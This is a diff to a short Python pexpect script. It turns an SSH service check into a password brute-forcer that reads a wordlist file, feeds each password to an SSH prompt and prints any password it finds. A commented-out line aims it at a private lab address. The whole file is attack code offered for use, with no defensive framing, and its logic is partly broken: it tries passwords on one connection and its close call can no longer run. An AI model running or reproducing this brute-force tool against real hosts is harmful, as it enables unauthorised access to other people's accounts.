@@ -1,34 +1,37 @@
 import pexpect
 
-def connect(host, num):
-    ssh_netkey = 'continue connecting'
-    connStr = 'ssh '+ host+' -p '+num
+def connect(ip, port):
+
+    connStr = 'ssh '+ ip +' -p '+ port
     child = pexpect.spawn(connStr)
-    ret = child.expect(['continue connecting', pexpect.TIMEOUT, pexpect.EOF, \
-            '[P|p]assword:'], timeout=10 )
+    ret = child.expect([pexpect.TIMEOUT, pexpect.EOF, \
+            '[P|p]assword:', 'continue connecting'], timeout = 10)
 
-    try :
-        if ret == 0 :
-            #print('[+] This is SSH Service')
-            a = 1
+    fn = open('/root/Desktop/passFile.txt', 'r')
+    #print(ret)
+    
+    if ret == 0 :
+        a = 0 #TIMEOUT
+        return a
 
-        if ret == 1 :
-            #print('[-] Error connecting')
-            a = 0
+    elif ret == 1 :
+        a = 0 #EOF
+        return a
 
-        if ret == 2 :
-            #print('[-] EOF Error ')
-            a = 0
-              
-        if ret == 3: 
-            #print('[+] This is ssh service.. but error')
-            a = 1
-
-    except pexpect.EOF:
-        print'EOF@!!!!!!'
-
+    elif ret == 2 :
+        print('[*] This is SSH Port ')
+        print('[*] PASSWORD ATTACKING ')
+        a = 1 #SSH PORT
+        
+        for line in fn.readlines():
+            print(' [-] Password :', line.strip('\n'))
+            child.sendline(line.strip('\n'))
+            prom = child.expect([pexpect.EOF, pexpect.TIMEOUT, 'login:'], timeout = 7)
+            if prom == 2 :
+                print(' [+] FIND ! Password : ', line.strip('\n'))
+        return a
 
     child.close()
 
+#print(connect('192.168.175.130', '22'))
 
-    return a
